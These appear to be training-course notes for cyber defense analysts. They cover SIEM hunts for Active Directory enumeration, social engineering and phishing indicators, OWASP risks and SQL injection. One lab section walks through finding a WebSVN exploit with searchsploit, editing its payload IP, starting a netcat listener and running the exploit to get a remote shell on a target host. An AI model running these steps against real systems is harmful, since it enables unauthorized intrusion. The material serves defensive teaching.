This makes analyzing logs much easier because it allows for quick inspection of the fields that are known to provide the most value during an investigation.


8. Adversaries use NET.exe for AD enumeration, so add a condition to the search so that it returns logs only where process.name is net.exe.
event.code: 1 AND process.name: net.exe


![image](https://github.com/user-attachments/assets/4d4e8ecd-2788-4a9d-8f8f-3b95ef9897ce)


Both CH-DEV-1.vcch.lan and ch-dc1.vcch.lan appear to have had net.exe activity in this time range. From the original search (see Figure 6.5-14), it was observed that there is some sort of machine activity running every 30 minutes, and the net.exe activity on ch-dc1.vcch.lan appears to fall into that machine activity. This machine activity should be reported to the IT team. However, an even more interesting activity is occurring on CH-DEV-1.vcch.lan. Trainee, a non-admin user, is running net commands to enumerate information about users, groups, and shares. It even appears that they attempted to gain access to a share called bkup on the DC. This needs to be reported right away.

![image](https://github.com/user-attachments/assets/b25cb4a7-e834-426a-be7b-866c0b444408)


---------------------------------------------------------------------------------------

Detecting PowerSploit/PowerView Usage
This lab covers techniques to detect AD enumeration performed with PowerSploit/PowerView.

﻿

The CPT has been assigned to a mission to hunt for AD enumeration using PowerSploit/PowerView. The time range used for this activity is Oct 27, 2021 @ 10:00:00.000 → Oct 27, 2021 @ 11:00:00.000.

﻿

Workflow

﻿

1. Log in to the win-hunt VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Chrome.

﻿

3. Select the Discover - Elastic bookmark.

﻿

4. Log in to Security Onion using the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

5. Search for all logs that fall within the time range Oct 27, 2021 @ 10:00:00.000 → Oct 27, 2021 @ 11:00:00.000.

﻿

![image](https://github.com/user-attachments/assets/3804ad13-5354-4119-979e-55e328c5cb39)


6. Because PowerSploit/PowerView uses PowerShell, focus on reviewing PowerShell logs. Filter the logs to show only PowerShell logs.
event.module: powershell


![image](https://github.com/user-attachments/assets/1d4f5fe9-c63a-40df-a591-eddc7eeae9f4)

7. Using the same steps used when detecting NET.exe usage earlier, add the following fields to make analyzing the logs easier:
host.name
user.name
powershell.command.name
file.directory
file.name
powershell.file.script_block_text
event.code
event.action


![image](https://github.com/user-attachments/assets/6d25bdc6-2319-4125-b8c6-c4e7a2765d99)

The results show more than 40,000 logs — far too many to sift through efficiently.


Use a visualization to see which PowerShell modules are being used in the environment.


8. Right-click the browser tab, and select Duplicate.

![image](https://github.com/user-attachments/assets/8d8a08a7-938e-4c71-bd7b-1de0e8da84b9)


9. On the duplicate tab, select the menu button in the top left corner, and then select Visualize Library.

![image](https://github.com/user-attachments/assets/58cc3357-d09e-4e57-9643-c088414c7fd2)

10. Select the Create visualization button in the top right corner of the User Interface (UI).

![image](https://github.com/user-attachments/assets/d8c14407-be26-438c-b465-b91bd35f2b59)

11. Select Lens.

![image](https://github.com/user-attachments/assets/59dcae19-e69a-4f28-989b-8168fb401c30)

12. Search for, and then drag and drop, the following fields into the center of the screen:
host.name.keyword
file.name.keyword

![image](https://github.com/user-attachments/assets/10730257-1cc6-47ef-9c46-7fce9ddec64a)

13. Select Table from the Chart Type drop-down menu (which has Bar vertical stacked as the default option).

![image](https://github.com/user-attachments/assets/168e2d7b-dc67-4441-a077-298711e2045a)

It appears that the Recon module and the PowerView script were used on ch-tech-1.

![image](https://github.com/user-attachments/assets/555ef922-8da2-4195-a988-726cca52c0d4)

14. Return to the Discover tab by selecting the original browser tab to the left of the duplicate tab created in Step 8.

![image](https://github.com/user-attachments/assets/49669609-8db7-4d0d-a3ec-16c52b3775f5)

15. Filter the logs to show only PowerShell activity on ch-tech-1.
host.name: "ch-tech-1.vcch.lan" AND event.module: "powershell"

![image](https://github.com/user-attachments/assets/f4e685ab-f0bd-42c1-a3b7-47b9fa100875)

Ensure the time column is in ascending order. It can be toggled by selecting the blue triangle next to the word Time. The triangle will point up when it is sorting in ascending order.


There are two similar spikes on the time chart.


16. Add a condition to the search query so only event codes 4103 and 4104 are returned. Event code 4103 is PowerShell module logs, and 4104 is PowerShell script block logs.
host.name: "ch-tech-1.vcch.lan" AND event.module: "powershell" AND event.code: (4103 OR 4104)

![image](https://github.com/user-attachments/assets/cfdace1f-8ae7-4785-9be2-eb87d32a0a8e)

17. Select the spike in the time chart located at 10:16.

![image](https://github.com/user-attachments/assets/5a729ecc-41b8-4683-9241-594bb78caec6)

It appears that Find-DomainShare was run on ch-tech-1. The logs show that entire functions are logged in powershell.file.script_block_text. These are the functions that Find-DomainShare kicked off. Those exact functions can be found in PowerSploit's recon module code on GitHub.


Notice similar logs in the second spike. It appears that Find-DomainShare was run twice on ch-tech-1. This should be reported right away.


-------------------------------------------------------------

Detecting BloodHound/SharpHound Usage
This lab uses Sysmon event ID 3 to detect SharpHound's initiation on a system.

﻿

The CPT has been assigned to a mission to hunt for AD enumeration. The team has received intel that an adversary known to target city government networks has used BloodHound/SharpHound in the past, so that will be the focus of the hunt. The time range used is Oct 27, 2021 @ 14:30:00.000 → Oct 27, 2021 @ 15:30:00.000.

﻿

Workflow

﻿

1. Log in to the win-hunt VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Chrome.

﻿

3. Select the Discover - Elastic bookmark.

﻿

4. Log in to Security Onion using the following credentials (if needed):

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

5. Add the following fields to the search, and set the time range to align with this hunt as Oct 27, 2021 @ 14:30:00.000 → Oct 27, 2021 @ 15:30:00.000.

host.name

user.name

event.code

event.action

source.ip

source.port

destination.ip

destination.port

process.executable

process.name

﻿![image](https://github.com/user-attachments/assets/9144f14e-1df6-4252-96e7-18ab809c681b)

6. Create a query to show only Sysmon event ID 3 network connection logs.
event.code: 3

![image](https://github.com/user-attachments/assets/56e7fee4-0a31-43ac-acf3-d7e246d0feef)

7. Narrow the search to look for logs where the destination port is 389 or 636 or 445.
event.code: "3" AND destination.port: ("389" OR "636" OR "445")



Check the process.name field to see the top process names in the results.


![image](https://github.com/user-attachments/assets/3353b054-afbe-4f44-be05-616783b46bb6)


SharpHound.exe constitutes 19% of the results.


8. Select the plus sign next to "19%" to see more information.

![image](https://github.com/user-attachments/assets/73bb3384-4e67-4020-b121-a08bd67d6254)


![image](https://github.com/user-attachments/assets/a6af7ed3-8193-42e7-8c76-e03d41691ba0)

There are 19 SharpHound logs, some with a destination port of 389 and some with a destination port of 445, as expected. Notice that process.executable provides the path where SharpHound was run on the system.


This activity on ch-tech-1 should be reported right away.


![image](https://github.com/user-attachments/assets/e3291d41-cdbc-4ef4-abda-045f43455508)


---------------------------------------------------------------

########## M7 L1 ############
######### Social Engineering ###########

Social Engineering | Overview
Social engineering is the exploitation of emotional and trust vulnerabilities already present in the human psyche. It can be performed through a variety of attack vectors, including in-person, voice, physical, virtual deception, and, most prevalently, email.

﻿

Social engineering is a tactic employed during the Reconnaissance and Exploitation phases of the attacker lifecycle.


![image](https://github.com/user-attachments/assets/014bf213-f362-4de7-adaf-66c9796a6c4f)

This tactic encompasses a variety of techniques, including:
Phishing
Media drops
Vishing
Smishing
Tailgating

Techniques


Phishing


Phishing is the most prevalent form of social engineering. This involves the use of email to elicit sensitive information from a victim or entice the victim's participation in an attack by downloading a malicious file that gives unauthorized access to a threat actor. 


Spear-phishing is a subset of this technique that employs targeting to craft a highly effective message that is designed to exploit a person in his or her unique context. For example, an individual will receive messages from a person of authority at her local bank or gym requesting personal information such as full name, birthdate, Social Security number, account information, or credit card numbers in order to resolve an important issue or offer an enticing deal. But this is in fact a social engineer who gathered information about the individual from social media posts and profiles or simple search engine results. 


Media Drops


One form of social engineering using physical media that has achieved great success historically is the strategic placement of electronic media — such as Universal Serial Bus (USB) drives — around a target work environment. These drives are loaded with malware that either achieves a specific effect on the mission partner network or provides some form of access to the threat actor when inserted into a drive in one of the network's computers. This technique plays on the human emotions of greed or curiosity, exploiting the assumption of a user who picks up the drive that they have just gained something for nothing or are just curious as to what is stored on the medium. 


Voice Phishing


Voice phishing (vishing) is an effective form of social engineering that makes use of human voice, particularly leveraging the human emotions of intimidation, pity, or pride to elicit victim cooperation in a threat actor's operations in a time-sensitive pressurized situation. This o ccurs when a n adversary attempts to manipulate a victim into disclosing sensitive information or giving them access to the victim's device over a phone call, such as when attackers pretend to call as an IRS employee during tax season. In that case, the attacker often uses fear or implied authority to pressure the target into giving them personal information or compensation. Vishing scams like this one often target older individuals, but anyone can fall for a vishing scam if they are not adequately trained.


Short Message Service Phishing


Short Message Service (SMS) phishing (smishing) is an application of the principles and techniques that have made phishing successful, but it is done through SMS/text messaging. 


![image](https://github.com/user-attachments/assets/a5055e4a-621d-4214-a3d2-f4a65e47f573)


Tailgating


Tailgating is a simplistic social engineering attack used to gain physical access to an unauthorized location. Tailgating is achieved by closely following an authorized user into the area without being noticed by the authorized user. An attacker may tailgate another individual by quickly sticking their foot or another object into the door right before the door is completely shut and locked. 


Piggybacking is exceptionally similar to tailgating. The main difference between the two is that, in a piggybacking scenario, the authorized user is aware and allows the other individual to piggyback off their credentials. An authorized user may feel compelled by kindness to hold a secure door open for a woman holding what appears to be heavy boxes or for a person claiming to be a new employee who has forgotten their access badge.

![image](https://github.com/user-attachments/assets/c32bdf8a-9026-424b-8dac-8e2a7a26f369)


--------------------------------------------------------------

Phishing Review | Common Attributes
Phishing emails tend to exhibit one or more of the following attributes:

Attack vector: This is commonly a link or attachment that leads the user to an attacker's code hosted on a webpage or a malicious file, which when downloaded and executed on a user's system gives an attacker remote access or performs a specific effect.

Unprofessional appearance: These include misspellings, poor grammar, and/or unprofessional or missing graphics.

Pretext: A scenario in which a social engineer places a user through a sense of urgency, or conversations or wording that employ the use of fear, authority, greed, or guilt to elicit an emotional response from the user, which leads to accomplishing an attacker's desired task.
This is hard to consistently identify but constitutes more of a common sense or gut feeling.

Information elicitation: An attempt to elicit personal information  — email, SSN, bank account numbers, etc. — either to gain valuable information directly or to put together a profile of a user that leads to account compromise.

Generic greeting, subjects, or salutations: The use of Hello, Dear Customer, or the lack of any greeting at all should immediately raise suspicion. Likewise, a generic signoff that does not indicate the sender or the lack of cryptographically signed origin within the mission partner organization may be evidence of spoofed addresses.

Source mismatch: Addresses do not match the purported organization.

The following example displays the attributes of an attack vector in the form of a malicious file, an unprofessional appearance in the lack of appropriate branding images, a generic greeting that does not identify the user, an attempt to gain personal information, and a social engineering pretext — the fear of losing access to financial data.


![image](https://github.com/user-attachments/assets/472fa197-fdd3-4355-acff-eb63af31e2d2)

This second example exhibits many of the same problems but uses better graphics and more professional language. However, the use of generic greetings, a social engineering pretext, and a malicious link (instead of attachment) betray this as yet another phishing attempt.

![image](https://github.com/user-attachments/assets/26c4aabd-675e-41ba-b038-cbb71563913e)

![image](https://github.com/user-attachments/assets/6a479774-6967-4416-8ead-8ae54fc51220)


-----------------------------------------------

Phishing Review | Identifying Phishing Messages
Understanding what constitutes phishing messages is important, but identifying them in practice and training others to do so is even more important. Use the knowledge gained in this lesson to identify phishing messages in a mission partner user's inbox. 


--------------------------------------------

Responding to Phishing Campaigns | Common Attributes
In addition to a suspicious message from the State Department, Karen also had an email supposedly reporting a security concern from Facebook. Other users in the mission partner organization have reported similar messages in their inboxes, so this is likely part of a larger phishing effort targeting this organization. Once a message is identified as likely part of a phishing campaign, it is essential to develop Indicators of Compromise (IOC) to identify other messages that may be circulating around the organization.

﻿--------------------------------------

 
Responding to Phishing Campaigns | Practical Analysis
Having identified socially engineered phishing messages and gathering several important IOCs regarding the phishing campaign that this is a part of, use a Security Information and Event Management (SIEM) system to locate Zeek logs of the suspicious email traffic. This skill is useful in identifying similar messages propagating through the organization.

--------------------------------------

Social Engineering Mitigations | Pyramid of Pain
The effects of social engineering can be mitigated through a combination of technical and educational means. Each type of mitigation represents a level of David Bianco's cybersecurity Pyramid of Pain.

![image](https://github.com/user-attachments/assets/90faa485-3045-4062-820f-a66ceeafb428)

The general idea is that some types of defense are easier to execute and stop, but with increasing sophistication and narrower focus, effective defenses require increasing amounts of work, resources, and comparable sophistication. 


Antivirus


One of the easiest mitigations to implement is simple signature-based detection and prevention, which is available through the installation and maintenance of antivirus software, such as Windows Defender. These applications simply use hash values or binary signatures of known malware to detect those files and prevent their execution. This is the lowest level of the Pyramid of Pain and solves the problem of even the most uninformed user opening a malicious file sent by a generic attacker who cannot afford or create more unique malware. 


Restrict Web Content


Employing basic URL or IP address-based blacklists or installing a web proxy that blocks the loading of malicious scripts is a next-level layer of protection and stops threats that continue to use the attack sources that have been detected, reported, and converted to threat intelligence. 


Heuristics


One example of the heuristic-based determination of messages as phishing emails is the NIST Phish Scale. This scale attempts to categorize messages according to a trustworthiness scoring that can automate the process of preventing phishing messages from reaching user inboxes. It examines certain cues as elements of the message that may indicate whether a message is suspicious or not.


The intended use of this sort of numerically based heuristic scale is to apply the calculations with a neuro-linguistic processing engine to highlight certain messages for review. The value of such a system is to reduce the burden and workload for human defenders, and in cases where the organizational appetite allows for it, messages with high enough scores can be discarded outright.


Error


These are cues relating to spelling and grammar errors and inconsistencies contained in the message. Considerations that the scale makes to determine likelihood are whether the message contains spelling or grammar errors, including mismatched plurality, or other inconsistencies.


Technical Indicator


These cues pertain to email addresses, hyperlinks, and attachments in the message. The presence of file attachments — especially an executable — scores highly, as do spoofed display names and URL hyperlinks that hide the true URL behind text. The scale also considers whether the domain name used in the email address and links looks similar to a legitimate entity's domain.


Visual Presentation Indicator


These are cues relating to branding, logos, design, and formatting. When there is no or minimal branding, out-of-date logo, or unprofessional design elements, and a lack of security indicators and icons that would otherwise be present, the Phish Scale dictates that these messages are scored highly.


Language and Content    


These are cues such as a generic greeting and lack of signer details or the use of time-sensitive pressure and threatening language. The scale examines the language of a message for indications of legal language with copyright or tax implications, distracting details not relevant to the content, requests for sensitive information such as PII, use of threats, sense of urgency to gain compliance, and lack of signer details.


Common Manipulation Tactics    


These are the use of humanitarian appeals, too-good-to-be-true offers, time-limited offers, poses as a friend, colleague, or authority figure, and so on. This scores whether the message makes appeals to help others in need, offer unlikely winnings or monetary offers, time-sensitive deals, mimics a plausible work process, package delivery, or poses as a known colleague.


User Training


Humans at the keyboard are always going to be the most important and most vulnerable line of defense against social engineering. Educating and empowering these users pays dividends far beyond installed scanners, filters, alerts, or firewalls — though these should always be employed and configured well.


Properly training users represent the top of the information security Pyramid of Pain. It is the hardest to do and requires proportionally more work than required to address any other threat, but if effective, it provides the greatest return on investment in the fight against savvy and malicious threat actors and their techniques for eliciting information and access.


Basic Phishing Prevention


As highlighted many times in this lesson, the entire goal of a social engineering attack is to elicit user cooperation, which includes divulging information, clicking links, and opening attachments. Therefore, the most basic skills that should be ingrained into all users are to inspect every URL before opening and to never open links or attachments from untrusted sources.


It is impossible to reasonably prevent junk mail from being opened at all, because many messages effectively pass modern junk mail scanners or contain convincing subject lines (e.g., your package has been lost/delivered), but preventing users from being twice beguiled by opening a malicious access point is the real goal of this sort of training. If an organization can effectively train these two fundamentals and educate its users on what attributes indicate trustworthiness, then the largest attack surface in modern computing systems is nullified.


Personally Identifiable Information


These are pieces of information that are unique to the individual or highly sensitive and should never be disclosed:
Social Security number
Driver's license number
Financial records
Medical records

It is important to note that some forms of information, such as work role title, assigned organization, and certifications, may not by themselves be PII or sensitive. The concatenation of all these data together can form a picture that identifies an individual in a critical role (such as database administrator) that may make them a target. The conglomeration of familial information, such as a mother's maiden name, and other personal information such as birthday, addresses, or graduating high school could create a source of valuable information that a threat actor could use to crack likely credentials.


Safeguarding PII


The following are effective means to prevent PII from falling into the wrong hands:
Do not email PII to a personal email account. 
Do not leave PII unattended on desks, printers, or copiers, and remember to secure it when away from your desk or leaving for the day. 
Use secure methodologies, such as encryption, to electronically transmit sensitive PII or store it on mobile computers, mediums, and other devices.
Lock or log off of unattended computer systems.
Never share account information with anyone, especially usernames or passwords.
Destroy sensitive paper PII by shredding or using burn bags.

![image](https://github.com/user-attachments/assets/909b07c2-452d-4c47-94ad-376890dbb364)

![image](https://github.com/user-attachments/assets/07425a24-282a-4e31-ab9d-52f07b208909)


-----------------------------------------

########## M7 L2 ############
######### Finding and Using an Exploit ###########

Sources for Known Exploits
Searching for known exploits is a matter of conducting open-source research and consulting the appropriate resources. CDAs find the following resources helpful in searching for pre-existing exploits.

﻿

MITRE CVE
﻿

MITRE Common Vulnerabilities and Exposures (CVE) is not necessarily a repository of exploits, per se, but functions more like a catalog of known software vulnerabilities that establishes a standard on how they should be reported. Each vulnerability is assigned a CVE Identifier (CVE-ID); most exploits can be mapped back to a CVE-ID. MITRE's CVE database can be found at cve.mitre.org.

﻿

National Vulnerability Database
﻿

The National Vulnerability Database (NVD) is — as the name suggests — a database that stores information about vulnerabilities and is maintained by the National Institute of Standards and Technology (NIST). Unlike CVEs however, the NVD provides more comprehensive information on a vulnerability other than the fact that it exists. Some additional information that the NVD provides is the Common Vulnerability Scoring System (CVSS) score, as well as links to associated resources such as existing exploits. This allows for a more proactive approach, as a CVSS score provides a severity gauge that system owners can use to prioritize vulnerabilities that need to be addressed, rather than reacting due to being exploited. The NVD can be accessed by visiting nvd.nist.gov.

﻿

Exploit-DB
﻿

Exploit-DB is a database for publicly known exploits maintained by Offensive Security. Each entry maps back to a CVE-ID, which enables defenders to match exploits back to the corresponding vulnerability. The Exploit-DB is intended as a repository of exploits and PoCs rather than an advisory system. However, if there are exploits available for systems or software in the mission partner network on Exploit-DB, it would be advisable to expeditiously patch vulnerable systems or implement other mitigations.

﻿

Metasploit
﻿

The Metasploit Project is an open-source penetration testing platform maintained by Rapid7. The free version is known as the Metasploit Framework. While much less comprehensive than Exploit-DB, the Metasploit Framework contains hundreds of exploits that are very easy to use with plug-and-play functionality, which makes it popular for offensive and defensive cyber personnel alike. Exploit-DB often has exploits written to be easily integrated into the Metasploit Framework as well. If a mission partner is found to have internet-facing systems that are vulnerable to exploits found in the Metasploit Framework, Incident Response (IR) and forensics may be a more appropriate measure, as it is extremely likely that the network is already compromised.

﻿

In the following lab, use a terminal utility that queries a locally stored copy of Exploit-DB to search for publicly-available exploits.

﻿

Lab Scenario
﻿

Given the following host, examine if the running services have associated public exploits.

Internet Facing Host: 200.200.200.10


-------------------------------

Making Modifications to a Script to Suit the Target Environment
The exploit script was examined in step 9, and no modifications were needed.

--------------------------------------------

Mitigating Known Exploits
Mitigating known exploits is usually a matter of removing the underlying vulnerability; if the vulnerability does not exist, then the exploit does not work. However, network defenders need to be aware of the vulnerabilities and remain updated on the latest ones to be able to effectively mitigate them. Mitigating vulnerabilities may be composed of a few elements.

![image](https://github.com/user-attachments/assets/27a84d37-cd9e-4eb1-bbad-f2f1411c9894)


Asset Management


To know which devices are vulnerable, it is necessary to know what devices actually exist within the network. While this sounds like a simple matter, asset management can quickly get out of hand, especially in larger organizations. Vulnerable devices do not just apply to workstations and servers; it applies to any computing device running some kind of OS. This includes Internet of Things (IoT) devices, multi-function devices, printers, video teleconferencing equipment, etc., which many network defenders overlook. 


Updates and Patching Policy


Updates and patches are among the most effective measures of mitigating known exploits. Once a vulnerability is made public, vendors typically issue a patch that can be applied to the vulnerable system. Patches are often referred to as hotfixes or security updates. While applying the necessary patches seems like a common-sense measure, organizations may not have an effective patching policy in place, which leaves them vulnerable to the whims of attackers. For example, in the Equifax Breach that occurred in 2017, attackers exploited a vulnerability in Apache Struts when the patch was released two months prior.


Once an idea of what type of systems exist in the network is determined, the next piece of the puzzle is to examine the update and patching policy. Are updates done monthly or weekly or even at all? Are they rolled out automatically? Which systems receive patches? These are some of the questions asked when investigating the updates and patching policy. A good patching policy typically includes the following steps:
Evaluating patchesTesting patchesApproving patchesDeploying patchesVerifying patch deployment
Some companies publish updates on a specific day of the month. Adobe, Microsoft, and Oracle release updates every second Tuesday of the month. This makes it easy for system administrators to plan around them and gives them time to schedule testing and deployment. Patch Tuesday — as it was coined, unfortunately — is followed by Exploit Wednesday. Since attackers also know the update schedule, they often attempt to reverse engineer the patches released on Tuesday, and then exploit devices on Wednesday since it is common for system administrators to not issue updates immediately.


Periodic Vulnerability Scans/Assessments


Vulnerability scanning and assessments were covered in a previous module. Some of the tools covered included Assured Compliance Assessment Solution (ACAS), OpenVAS, and Nmap. Conducting periodic vulnerability scans reveals vulnerabilities not addressed by updates and patching. They may also catch configuration-related vulnerabilities, weak passwords, etc. Vulnerability scans allow system administrators to proactively identify existing vulnerabilities and defend their systems before attackers exploit them. One important note to keep in mind is that a vulnerability scanner is only as good as its signatures. To get the best use out of a vulnerability scanner, conduct regular updates on the software to have the most up-to-date vulnerability database.


![image](https://github.com/user-attachments/assets/44319765-a0e8-4f38-bf90-3de60d30b280)

![image](https://github.com/user-attachments/assets/9acdf486-e490-4e3e-8695-bb4bf170b868)


-------------------------------------------------

Scenario
The mission partner has an internet-facing host. The supported commander wanted to ensure that it was secured against unauthorized external access. The CPT has been tasked to verify that the internet-facing host is secure. Use the provided kali VM to investigate the mission partner's system.

Internet Host: 190.13.1.9
1. Log in to the kali-hunt VM using the provided credentials:

Username: trainee
Password: CyberTraining1!
﻿

![image](https://github.com/user-attachments/assets/5488aed9-65cc-4e8e-a3b8-79592605d845)

-------------------------------------

Finding the Service Versions
The software versions can be found by running a versioning scan.

![image](https://github.com/user-attachments/assets/8d09803e-d155-4545-ad38-44e12c484cf4)

From the scans, it appears this is another Ubuntu host, with the following services running:
OpenSSH 8.2
Apache HTTPD 2.4.41

-------------------------------------------------

Locating the Web Server Application
The software can be found by opening a web browser and visiting the webpage to see if there are any additional applications running on top of Apache.

![image](https://github.com/user-attachments/assets/b3afe83d-ea6b-4e8b-9515-ca9bad260fd1)


It appears that Subversion — or more concisely, the web application version of Subversion — is running on this host. Subversion is a version control application similar to Git, with a few differences. WebSVN is the web application version.


If the bottom of the page is viewed, the versioning of the software is provided as well.

![image](https://github.com/user-attachments/assets/9b6f018b-8875-4ad6-bc1c-74f47d33f9c1)

-------------------------------------------

Finding the Exploit
Search for exploits related to the software running on the host for the software discovered through host enumeration:

OpenSSH 8.2

Apache HTTPD 2.4.41

WebSVN 2.6.0

Apache Subversion 1.13.0

OpenSSH 8.2 was searched previously with no viable exploits.

﻿

Apache has no promising exploits.﻿

﻿

WebSVN has promising exploits, namely the last one on the list with the ID 50042.

﻿![image](https://github.com/user-attachments/assets/ca65114b-dedb-4ca9-9f28-dd11d7b8b9a0)



Apache subversion does not have any exploits that may be applicable; both options are DoSs and the scenario calls for checking for unauthorized remote access.

![image](https://github.com/user-attachments/assets/81443664-45ce-4fad-bdbb-c9b06faf1db3)


------------------------------------

Modification Walkthrough
The full path to the exploit can be found by running the following command:

(trainee@dmss-kali)-[~] $ searchsploit -p 50042
﻿

After getting the path, the exploit script can be viewed, which is shown  in Figure 7.2-25:


![image](https://github.com/user-attachments/assets/c2be7495-c086-4be7-b59a-e8907b6a9563)

Notice that line 14 beginning with PAYLOAD has a default IP address that needs to be changed. The port can be changed as well. Line 28 is also an acceptable answer because line 28 is where the PAYLOAD variable is used.


Make sure to modify copies of the exploit to prevent any unintended modification of the original. The modified script is shown in Figure 7.2-26:

![image](https://github.com/user-attachments/assets/fecca07f-e616-4d9d-831f-376dc62a2da4)


-------------------------------------

Executing the Exploit
The listener needs to be started first, which can be done with the following command:

(trainee@dmss-kali)-[~] $ nc -nlvp 4444
﻿

Then the exploit can be run by using the following command:

(trainee@dmss-kali)-[~] $ python3 50042.py http://190.13.1.9/****

![image](https://github.com/user-attachments/assets/7277bb33-cfe0-4da7-9544-f00b6759c393)


Once the exploit is run, a connection can be seen in the terminal running Netcat.


![image](https://github.com/user-attachments/assets/d542d4a0-8aee-4011-9fc1-72edf0b66c2e)


If desired, functionality can be confirmed by running commands:
www-data@5346ab610561:/var/www/websvn$ whoami

![image](https://github.com/user-attachments/assets/834aa089-4b18-4928-aece-95634d51d6d9)

G iven a list of services,  and with minor modifications, a viable exploit was found and used. 

-------------------------------------------------------

############## CDAH-M7L3 Web Application Attacks ##############

Web Attacks Overview 
Adversaries may look to exploit the Application layer of the Open Systems Interconnection (OSI) model — Layer 7. Layer 7 is the top layer of the model. It is at the Application layer where users interact with software (applications) that can be connected to the internet. The servers and databases are responsible for hosting the web applications, which may be vulnerable to attacks. The servers and databases connected to the internet are designed to be running and reachable by users at all times, meaning they are constantly susceptible to an attack. The servers and databases also often contain sensitive data regarding Personal Identifiable Information (PII) and information regarding the systems and services to which they are connected, making them an attractive target for the adversary. Another obstacle for defense teams to consider is the location of the servers and databases on the network. 

-------------------------------------

OWASP Top 10 Web Application Security Risks

![image](https://github.com/user-attachments/assets/b97af7c8-bc6d-43cc-ac8e-03ce2da3702a)

The leading organization in defining risks, vulnerabilities, and providing defensive strategies for web applications and attacks is Open Web Application Security Project® (OWASP). OWASP is a nonprofit foundation whose primary goal is to improve the security of software. The OWASP Top 10 Web Application Security Risks — simply referred to as the OWASP Top 10 — is a standard awareness document for developers and web application security. The OSWAP Top 10 represents a broad consensus about the most critical security risks to web applications. Below is the 2024 OWASP Top 10:


1. Broken Access Control


User access restrictions are often not properly enforced or enforced insecurely, which can allow attackers to gain unauthorized functionality (e.g., administrator portal) or access to other user accounts, data, etc.


2. Cryptographic Failures 


A broad symptom rather than a root cause, the focus is on failures related to cryptography — or lack thereof. This often leads to exposure of sensitive data. An organization must determine the protection needs of data in transit and at rest. For example, passwords, credit card numbers, health records, PII, and business secrets require extra protection, mainly if that data falls under privacy laws (e.g., European Union's General Data Protection Regulation [GDPR]) or regulations (e.g., financial data protection such as Payment Card Industry Data Security Standard [PCI DSS]).


3. Injection


Injection flaws occur when untrusted data is passed to an interpreter as part of a command or query within a web application. The untrusted data can allow the attacker to execute code on the underlying web server. These flaws can be associated with, but are not limited to, SQL, NoSQL, Operating System (OS), and Lightweight Directory Access Protocol (LDAP), and can provide access to the underlying web server in many cases. Exploitation leads to server access.


4. Insecure Design 


Insecure design is a broad category representing different weaknesses, expressed as missing or ineffective control design. Insecure design is not the source for all other Top 10 risk categories. There is a difference between insecure design and insecure implementation. The differentiation between design flaws and implementation defects is necessary as they have different root causes and remediation. A secure design can still have implementation defects leading to vulnerabilities that may be exploited. An insecure design cannot be fixed by a perfect implementation as, by definition, they need security controls that were never created to defend against specific attacks. One factor that contributes to insecure design is the lack of business risk profiling inherent in the software or system being developed, and thus the failure to determine what level of security design is required.


5. Security Misconfiguration


Security misconfiguration is the most commonly seen issue. These misconfigurations cover all aspects of security from insecure default configurations, unfinished installations, unpatched services, verbose logging, and many more. 


6. Using Components with Known Vulnerabilities


Web applications are often a melting pot of code from many other sources. Using modules and libraries that run with the same privileges as the rest of the web applications can increase the speed of development, but can also enable unknown vulnerabilities on a web application. If external code is not reviewed for patches and vulnerabilities, even the securest of coding practices can be left vulnerable. 


7. Identification and Authentication Failures


Confirmation of the user's identity, authentication, and session management is critical to protect against authentication-related attacks. There may be authentication weaknesses if the application:
Permits automated attacks such as credential stuffing, where the attacker has a list of valid usernames and passwords.Permits brute force or other automated attacks.Permits default, weak, or well-known passwords, such as Password1 or admin/admin.Uses weak or ineffective credential recovery and forgot-password processes, such as knowledge-based answers, which cannot be made safe.
8. Software and Data Integrity Failures 


Software and data integrity failures relate to code and infrastructure that do not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and Content Delivery Networks (CDN). An insecure Continuous Integration/Continuous Delivery (CI/CD) pipeline can introduce the potential for unauthorized access, malicious code, or system compromise. Lastly, many applications now include auto-update functionality, where updates are downloaded without sufficient integrity verification and applied to the previously trusted application. Attackers could potentially upload their own updates to be distributed and run on all installations. Examples that are vulnerable to insecure deserialization include objects or data encoded or serialized into a structure that an attacker can see and modify.


9. Insufficient Logging and Monitoring


Logging and monitoring are paramount for externally-facing services. Logging and monitoring of those logs are required in any Incident Response (IR) to draw the full picture of an incident. Without logging and monitoring, it is very difficult to review what happened during the incident or to even realize that an event occurred. Exploitation is not really a factor, but insufficient logging and monitoring affect all other compromise remediation.


10. Server-Side Request Forgery


Server-Side Request Forgery (SSRF) flaws occur when a web application is fetching a remote resource without validating the user-supplied Uniform Resource Locator (URL). It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, Virtual Private Network (VPN), or another type of network Access Control List (ACL).


As modern web applications provide end-users with convenient features, fetching a URL becomes a common scenario. As a result, the incidence of SSRF is increasing. Also, the severity of SSRF is becoming higher due to cloud services and the complexity of architectures.


In many cases, the OWASP Top 10 can be mitigated by filtering the user input prior to passing the data to the underlying services. Vigilance in patching and proper code review of any externally-sourced code helps decrease exploit vectors. If the web application is hosted on a web server, it is important to securely configure that underlying web server service as well as the other services on the host, and remove any unneeded services. For example, Common UNIX Printing System (CUPS) is a print server that is installed and enabled on many Linux distributions by default. CUPS has had nine documented Common Vulnerabilities and Exposures (CVE) since 2017, which include Remote Code Execution (RCE) that could lead to the compromise of a web server without any interaction with the web application itself.

![image](https://github.com/user-attachments/assets/8bdc8382-9ed3-43e4-ae77-d1e806bb266c)

---------------------------------------------

SQLI Overview
SQLI is an attack exploiting the injection of SQL commands into the SQL queries of a web application. A successful SQLI attack gains the adversary access to a database that operates as the backend to a web application. Web applications commonly use a database for storing and managing data such as user credentials. To interact with databases, entities such as systems operators, programmers, and web applications use the Structured Query Language (SQL). The code takes care of establishing and keeping the connection to the database by using connectors. The fundamental principle of an injection attack is identifying a vulnerability that enables an escape from the intended code or query, allowing the attacker to inject arbitrary code of their own, which is executed by the victim server under the guise of whichever process presents the web interface or backend database externally. In a SQLI attack, which targets poorly-coded requests for input that is inserted into a query to the backend database, the attacker principally seeks to achieve an escape through the use of characters that a web engineer failed to sanitize.

﻿

Most modern web applications need to keep some permanent storage. Storage is typically accomplished with a database. Web applications commonly communicate with their database backend using SQL. With SQL, the applications create queries to read and write information in the database.

﻿
![image](https://github.com/user-attachments/assets/5f253796-6851-49c9-a2c9-20ad6b76cef9)


